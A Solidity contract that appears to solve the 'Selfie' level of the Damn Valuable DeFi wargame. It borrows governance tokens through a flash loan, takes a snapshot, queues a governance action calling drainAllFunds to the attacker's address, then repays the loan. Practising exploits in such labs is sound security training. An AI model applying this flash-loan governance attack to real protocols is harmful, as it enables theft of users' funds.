// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker {
    address private immutable s_owner;

    SelfiePool private s_selfiePool;
    SimpleGovernance private s_governance;

    uint256 private s_actionId;

    constructor(address _selfiePool, address _governance) {
        s_owner = msg.sender;
        s_selfiePool = SelfiePool(_selfiePool);
        s_governance = SimpleGovernance(_governance);
    }

    function attack() external {
        s_selfiePool.flashLoan(1500000 * 1e18);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        address selfiepool = address(s_selfiePool);

        DamnValuableTokenSnapshot(_token).snapshot();
        s_actionId = s_governance.queueAction(
            selfiepool,
            abi.encodeWithSignature("drainAllFunds(address)", s_owner),
            0
        );
        DamnValuableTokenSnapshot(_token).transfer(selfiepool, _amount);
    }

    function getActionId() external view returns (uint256) {
        return s_actionId;
    }
}
